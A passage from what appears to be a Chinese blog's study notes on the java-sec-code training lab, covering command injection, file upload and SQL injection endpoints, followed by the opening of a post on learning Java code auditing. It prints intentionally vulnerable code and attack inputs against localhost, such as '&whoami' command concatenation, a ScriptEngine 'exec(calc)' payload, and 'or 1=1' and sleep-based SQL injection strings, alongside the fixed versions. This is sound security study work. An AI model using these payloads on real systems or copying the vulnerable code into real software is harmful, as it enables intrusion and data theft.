alt="image-20240720233026245"></p><p>Windows环境需修改部分代码</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720233319950.png" alt="image-20240720233319950"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720234006171.png" alt="image-20240720234006171"></p><p>然后右上角启动即可</p><p><strong>账号密码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">joychou/joychou123</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717234558446.png" alt="image-20240717234558446"></p><p><strong>首页</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717234823041.png" alt="image-20240717234823041"></p><p><strong>介绍</strong></p><p>该项目也可以叫做Java Vulnerability Code(Java漏洞代码)。</p><p>每个漏洞类型代码默认存在安全漏洞（除非本身不存在漏洞），相关修复代码在注释里。具体可查看每个漏洞代码和注释。</p><p><strong>问题</strong></p><p>下载的是<a href="https://github.com/JoyChou93/java-sec-code/archive/refs/tags/v2.0.0.zip%EF%BC%8C2.0.0%E7%9A%84%E7%89%88%E6%9C%AC">https://github.com/JoyChou93/java-sec-code/archive/refs/tags/v2.0.0.zip，2.0.0的版本</a></p><p>docker部署后，jdbc连接报错，换各个版本都不行</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240718002321976.png" alt="image-20240718002321976"></p><p>放弃了，选择IDEA部署</p><h2 id="CmdInject"><a href="#CmdInject" class="headerlink" title="CmdInject"></a>CmdInject</h2><h3 id="java命令执行的四种方式"><a href="#java命令执行的四种方式" class="headerlink" title="java命令执行的四种方式"></a>java命令执行的四种方式</h3><p><strong>参考资料</strong></p><p><a href="https://xu-an.gitbook.io/sec/lan/java/rce">浅析Java命令执行</a></p><p><a href="https://guokeya.github.io/post/JSChOsTri/">java中js命令执行</a></p><p><strong>常用的三种</strong></p><p>大佬的这张图很好，我就直接引用了</p><p>常用的是  java.lang.Runtime#exec() 和  java.lang.ProcessBuilder#start() ，除此之外，还有更为底层的 java.lang.ProcessImpl#start() ，他们的调用关系如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image.png" alt="image"></p><p><strong>js命令执行</strong></p><p>javax.script.ScriptEngine类是java自带的用于解析并执行js代码，scriptEngine支持执行java代码。那就可以在javascript中执行java代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String str = &quot;function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\&quot;calc\&quot;)&quot;;</span><br></pre></td></tr></table></figure><p><strong>两篇有意思的文章</strong></p><p><a href="https://xz.aliyun.com/t/8567?time__1311=n4+xnD0DcDuD907GkWD/ia+eYqrZaQSCYReD">java中js命令执行的攻与防</a></p><p><a href="https://xz.aliyun.com/t/8697?time__1311=n4+xnD0DcDu7G=DCz3DsA3xCqiK+4Q+Y+TwYTD">java中js命令执行的攻与防2</a></p><h3 id="codeinject"><a href="#codeinject" class="headerlink" title="&#x2F;codeinject"></a>&#x2F;codeinject</h3><p>debug模式看变量变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/codeinject?filepath=123</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720235110715.png" alt="image-20240720235110715"></p><p>命令拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localhost:8080/codeinject?filepath=%20%26whoami</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720235338957.png" alt="image-20240720235338957"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720235410708.png" alt="image-20240720235410708"></p><h3 id="codeinject-host"><a href="#codeinject-host" class="headerlink" title="&#x2F;codeinject&#x2F;host"></a>&#x2F;codeinject&#x2F;host</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/host&quot;)</span><br><span class="line">    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line">//从请求头中获取host参数的值赋给host</span><br><span class="line">        String host = request.getHeader(&quot;host&quot;);</span><br><span class="line">        logger.info(host);</span><br><span class="line">//        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">        String[] cmdList = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">        ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">        builder.redirectErrorStream(true);</span><br><span class="line">        Process process = builder.start();</span><br><span class="line">        return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>默认访问</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721000235672.png" alt="image-20240721000235672"></p><p>改包</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721001033836.png" alt="image-20240721001033836"></p><h3 id="codeinject-sec"><a href="#codeinject-sec" class="headerlink" title="&#x2F;codeinject&#x2F;sec"></a>&#x2F;codeinject&#x2F;sec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="line">    public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">        String filterFilePath = SecurityUtil.cmdFilter(filepath);</span><br><span class="line">        if (null == filterFilePath) &#123;</span><br><span class="line">            return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">        String[] cmdList = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;dir /s /q /w &quot; + filterFilePath&#125;;</span><br><span class="line">        ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">        builder.redirectErrorStream(true);</span><br><span class="line">        Process process = builder.start();</span><br><span class="line">        return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">        if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);</span><br></pre></td></tr></table></figure><p>白名单限制filepath只能是字母数字_&#x2F;.-这些字符，匹配到其他字符则返回null</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721002208081.png" alt="image-20240721002208081"></p><h2 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h2><h3 id="java文件上传漏洞"><a href="#java文件上传漏洞" class="headerlink" title="java文件上传漏洞"></a>java文件上传漏洞</h3><p><strong>参考资料</strong></p><p><a href="https://hackerqwq.github.io/2021/11/29/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">javaweb代码审计学习(文件上传漏洞)</a></p><p><strong>常见的三种上传方式</strong></p><ol><li>文件流</li><li>ServletFileUpload</li><li>MultipartFile</li></ol><p><strong>关键词</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.apache.commons.fileupload</span><br><span class="line">java.io.File</span><br><span class="line">MultipartFile</span><br><span class="line">RequestMethod</span><br><span class="line">MultipartHttpServletRequest</span><br><span class="line">CommonsMultipartResolver</span><br></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="&#x2F;file&#x2F;"></a>&#x2F;file&#x2F;</h3><p><strong>一些要修改的地方</strong></p><p>修改上传路径</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721165442744.png" alt="image-20240721165442744"></p><p>添加&#x2F;status路由和uploadStatus.html</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/status&quot;)</span><br><span class="line">    public String status(Model model, @ModelAttribute(&quot;message&quot;) String message) &#123;</span><br><span class="line">        model.addAttribute(&quot;message&quot;, message);</span><br><span class="line">        return &quot;uploadStatus&quot;; // 确保这个视图名称与您的HTML文件匹配</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;</span><br><span class="line">    &lt;title&gt;Upload Status&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;File Upload Status&lt;/h1&gt;</span><br><span class="line">&lt;p th:if=&quot;$&#123;message&#125;&quot; th:text=&quot;$&#123;message&#125;&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#x2F;对应&#x2F;upload，&#x2F;pic对应&#x2F;upload&#x2F;picture</p><p><strong>漏洞代码</strong></p><p>文件上传，检查是否为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;/upload&quot;)</span><br><span class="line">    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                                   RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">        if (file.isEmpty()) &#123;</span><br><span class="line">            // 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">            return &quot;redirect:/file/status&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            // Get the file and save it somewhere</span><br><span class="line">            byte[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">            redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                    &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return &quot;redirect:/file/status&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;redirect:/file/status&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="file-pic"><a href="#file-pic" class="headerlink" title="&#x2F;file&#x2F;pic"></a>&#x2F;file&#x2F;pic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    // only upload picture</span><br><span class="line">    @PostMapping(&quot;/upload/picture&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">    //检查文件是否为空</span><br><span class="line">        if (multifile.isEmpty()) &#123;</span><br><span class="line">            return &quot;Please select a file to upload&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//获取文件名、后缀名、MIME类型、生成临时文件</span><br><span class="line">        String fileName = multifile.getOriginalFilename();</span><br><span class="line">        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名</span><br><span class="line">        String mimeType = multifile.getContentType(); // 获取MIME类型</span><br><span class="line">        File excelFile = convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">        String picSuffixList[] = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">        boolean suffixFlag = false;</span><br><span class="line">        for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">        //小写后比较</span><br><span class="line">            if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!suffixFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">            deleteFile(excelFile);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">        String mimeTypeBlackList[] = &#123;</span><br><span class="line">                &quot;text/html&quot;,</span><br><span class="line">                &quot;text/javascript&quot;,</span><br><span class="line">                &quot;application/javascript&quot;,</span><br><span class="line">                &quot;application/ecmascript&quot;,</span><br><span class="line">                &quot;text/xml&quot;,</span><br><span class="line">                &quot;application/xml&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            // 用contains是为了防止text/html;charset=UTF-8绕过</span><br><span class="line">            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">                deleteFile(excelFile);</span><br><span class="line">                return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 判断文件内容是否是图片 校验3</span><br><span class="line">        boolean isImageFlag = isImage(excelFile);</span><br><span class="line"></span><br><span class="line">        if (!isImageFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">            deleteFile(excelFile);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            // Get the file and save it somewhere</span><br><span class="line">            byte[] bytes = multifile.getBytes();</span><br><span class="line">            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(excelFile);</span><br><span class="line">            return &quot;Upload failed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deleteFile(excelFile);</span><br><span class="line">        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&#123;&#125;&quot;, UPLOADED_FOLDER, multifile.getOriginalFilename());</span><br><span class="line">        return &quot;Upload success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteFile(File... files) &#123;</span><br><span class="line">        for (File file : files) &#123;</span><br><span class="line">            if (file.exists()) &#123;</span><br><span class="line">                boolean ret = file.delete();</span><br><span class="line">                if (ret) &#123;</span><br><span class="line">                    logger.debug(&quot;File delete successfully!&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 不建议使用transferTo，因为原始的MultipartFile会被覆盖</span><br><span class="line">     * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file</span><br><span class="line">     */</span><br><span class="line">    private File convert(MultipartFile multiFile) throws Exception &#123;</span><br><span class="line">        String fileName = multiFile.getOriginalFilename();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        UUID uuid = Generators.timeBasedGenerator().generate();</span><br><span class="line"></span><br><span class="line">        File convFile = new File(UPLOADED_FOLDER + uuid + suffix);</span><br><span class="line">        boolean ret = convFile.createNewFile();</span><br><span class="line">        if (!ret) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(convFile);</span><br><span class="line">        fos.write(multiFile.getBytes());</span><br><span class="line">        fos.close();</span><br><span class="line">        return convFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Check if the file is a picture.</span><br><span class="line">     */</span><br><span class="line">    private static boolean isImage(File file) throws IOException &#123;</span><br><span class="line">        BufferedImage bi = ImageIO.read(file);</span><br><span class="line">//        return bi == null; 这里判断有问题，改了一下</span><br><span class="line">        return  bi != null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="java-sql注入漏洞"><a href="#java-sql注入漏洞" class="headerlink" title="java sql注入漏洞"></a>java sql注入漏洞</h3><p><strong>参考资料</strong></p><p><a href="https://xz.aliyun.com/t/11672?time__1311=Cq0xRQIxuD9DlxGgx+orxcQAGCDnjGhOWoD#toc-0">JAVA常用框架SQL注入审计</a></p><p><strong>常见框架</strong></p><ol><li><p>JDBC拼接不当造成sql注入</p><p>JDBC存在两种方法执行SQL语句，分别为PreparedStatement和Statement，相比Statement ，PreparedStatement会对SQL语句进行预编译，Statement会直接拼接sql语句造成SQL注入漏洞</p></li><li><p>Mybatis框架下的sql注入</p><p> Mybatis使用parameterType向sql语句传参，在sql引用传参可以使用#{Parameter}和${Parameter}两种方式</p></li><li><p>Mybatis-plus框架下的sql注入</p></li><li><p>Hibernate框架下的sql注入</p></li></ol><h3 id="sqli-jdbc-vuln"><a href="#sqli-jdbc-vuln" class="headerlink" title="&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h3><p>sql查询语句拼接username参数，单引号包裹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Statement statement = con.createStatement();</span><br><span class="line">String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;</span><br><span class="line">logger.info(sql);</span><br><span class="line">ResultSet rs = statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/sqli/jdbc/vuln?username=bthcls%27%20or%201=1%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721211533433.png" alt="image-20240721211533433"></p><h3 id="sqli-jdbc-sec"><a href="#sqli-jdbc-sec" class="headerlink" title="&#x2F;sqli&#x2F;jdbc&#x2F;sec"></a>&#x2F;sqli&#x2F;jdbc&#x2F;sec</h3><p>采用<a href="https://www.cnpanda.net/sec/589.html">预编译机制</a>处理sql语句，此时的username只当做参数传进去，不会当做指令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// fix code</span><br><span class="line">String sql = &quot;select * from users where username = ?&quot;;</span><br><span class="line">PreparedStatement st = con.prepareStatement(sql);</span><br><span class="line">st.setString(1, username);</span><br><span class="line"></span><br><span class="line">logger.info(st.toString());  // sql after prepare statement</span><br><span class="line">ResultSet rs = st.executeQuery();</span><br></pre></td></tr></table></figure><p>下断点看sql语句的变化</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721212746731.png" alt="image-20240721212746731"></p><h3 id="sqli-mybatis-vuln01"><a href="#sqli-mybatis-vuln01" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h3><p>直接将变量username插入到sql语句</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721213218093.png" alt="image-20240721213218093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/sqli/mybatis/vuln01?username=bthcls%27%20or%201=1%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721213417081.png" alt="image-20240721213417081"></p><h3 id="sqli-mybatis-vuln02"><a href="#sqli-mybatis-vuln02" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h3><p>vuln01使用了<code>@Param</code>注解来指定方法参数<code>username</code>的名称和@Select&#96;注解直接在方法上定义了SQL查询语句，区别不大</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721213817312.png" alt="image-20240721213817312"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/sqli/mybatis/vuln02?username=bthcls%27%20or%201=1%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721213830591.png" alt="image-20240721213830591"></p><h3 id="sqli-mybatis-orderby-vuln03"><a href="#sqli-mybatis-orderby-vuln03" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><p>插入点换成了order by后面，参数为sort</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1 desc%23</span><br><span class="line">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br><span class="line">public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;</span><br><span class="line">return userMapper.findByUserNameVuln03(sort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721214242451.png" alt="image-20240721214242451"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=if(1=2,id,sleep(5))%23</span><br><span class="line">http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=if(1=2,id,sleep(0.1))%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721214841160.png" alt="image-20240721214841160"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721214859299.png" alt="image-20240721214859299"></p><h3 id="sqli-mybatis-sec01"><a href="#sqli-mybatis-sec01" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;sec01"></a>&#x2F;sqli&#x2F;mybatis&#x2F;sec01</h3><p>参数化查询，和预编译差不多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br><span class="line">public User mybatisSec01(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line">    return userMapper.findByUserName(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br><span class="line">User findByUserName(@Param(&quot;username&quot;) String username);</span><br></pre></td></tr></table></figure><h3 id="sqli-mybatis-sec02"><a href="#sqli-mybatis-sec02" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;sec02"></a>&#x2F;sqli&#x2F;mybatis&#x2F;sec02</h3><p>同上，换成了id</p><h3 id="sqli-mybatis-sec03"><a href="#sqli-mybatis-sec03" class="headerlink" title="&#x2F;sqli&#x2F;mybatis&#x2F;sec03"></a>&#x2F;sqli&#x2F;mybatis&#x2F;sec03</h3><p>查询接口，无参数</p><h3 id="mybatis-orderby-sec04"><a href="#mybatis-orderby-sec04" class="headerlink" title="&#x2F;mybatis&#x2F;orderby&#x2F;sec04"></a>&#x2F;mybatis&#x2F;orderby&#x2F;sec04</h3><p>加过滤，只允许字母数字-_&#x2F;.这些字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br><span class="line">public List&lt;User&gt; mybatisOrderBySec04(@RequestParam(&quot;sort&quot;) String sort) &#123;</span><br><span class="line">    return userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static String sqlFilter(String sql) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(sql).matches()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计学习（未写完）</title>
      <link href="/2024/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11%EF%BC%88%E6%9C%AA%E5%86%99%E5%AE%8C%EF%BC%89/"/>
      <url>/2024/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11%EF%BC%88%E6%9C%AA%E5%86%99%E5%AE%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="java代码审计学习（未写完）"><a href="#java代码审计学习（未写完）" class="headerlink" title="java代码审计学习（未写完）"></a>java代码审计学习（未写完）</h1><h2 id="学习前的一些想法"><a href="#学习前的一些想法" class="headerlink" title="学习前的一些想法"></a>学习前的一些想法</h2><p>希望能够通过学习java代码审计，来提高自己在比赛的成绩，同时更是在实战中，java漏洞的占比很大，许多时候遇到java漏洞不会不懂利用，很难受。应该掌握java的基础知识、漏洞代码审计、能独立开发一个小的java web应用、基本的攻击方式、IDEA的debug手法。java语言我认为是比php要难搞懂的一种语言，虽然大部分语言都有相同之处，但是没有经过练习、实践，实际碰到的时候都是一头雾水，php和python的话接触的情况比较多，拿到代码也不会一头雾水，能够上手调试，寻找漏洞。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.javasec.org/">攻击Java Web应用-[Java Web安全]</a></p><p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md">Java Sec Code</a></p><p><a href="https://cunyu1943.github.io/java-tutorial/javase/20220701-intro-to-java.html">Java 入门简介</a></p><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=200&vd_source=1e6700d2fc505dca863d569459c8c8c5">黑马程序员JavaWeb开发教程，实现javaweb企业开发全流程（涵盖Spring+MyBatis+SpringMVC+SpringBoot等）</a></p><p><a href="https://www.bilibili.com/video/BV1W64y1C7N8?vd_source=1e6700d2fc505dca863d569459c8c8c5">（强烈建议观看收藏）JSP从入门到精通-Javaweb课堂从入门到实战视频教程-轻松搞定jsp</a></p><p><a href="https://www.runoob.com/jsp/jsp-syntax.html">JSP菜鸟教程</a></p><p><a href="https://www.runoob.com/java/java-intro.html">Java菜鸟教程</a></p><p><a href="https://www.bilibili.com/video/BV1Sv4y1i7jf?vd_source=1e6700d2fc505dca863d569459c8c8c5">B站最全的Java安全学习路线</a></p><h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="idea旗舰版安装"><a href="#idea旗舰版安装" class="headerlink" title="idea旗舰版安装"></a>idea旗舰版安装</h3><p>社区版支持的功能还是少了很多，这里我选择不断试用旗舰版。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240716205520817.png" alt="image-20240716205520817"></p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p><strong>Hello</strong></p><p>从Hello World！开始，哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717213931272.png" alt="image-20240717213931272"></p><p><strong>反编译</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javap -c -l -p Main.class</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717214508439.png" alt="image-20240717214508439"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -dump &quot;Main.class&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717214651542.png" alt="image-20240717214651542"></p><p>Maven</p><p>Maven 是一个项目管理工具，包含了一个项目对象模型（<code>Project Object Model</code>），反映在配置中就是 <code>pom.xml</code> 文件。其中包含了一个项目的生命周期、一个依赖管理系统，以及定义在项目生命周期阶段的插件（<code>plugin</code>）和目标（<code>goal</code>）。</p><p>其中 Maven 最核心的两大概念包括 <strong>依赖管理</strong> 和 <strong>项目构建</strong>。</p><ul><li><strong>依赖管理</strong>：提供对 <code>jar</code> 的统一管理。（Maven 提供了一个中央仓库，当我们在项目中添加完依赖后，Maven 就会自动去中央仓库中下载相关依赖）。</li><li><strong>项目构建</strong>：Maven 提供对项目的编译、测试、打包、部署、上传到私服等。</li></ul><p><img 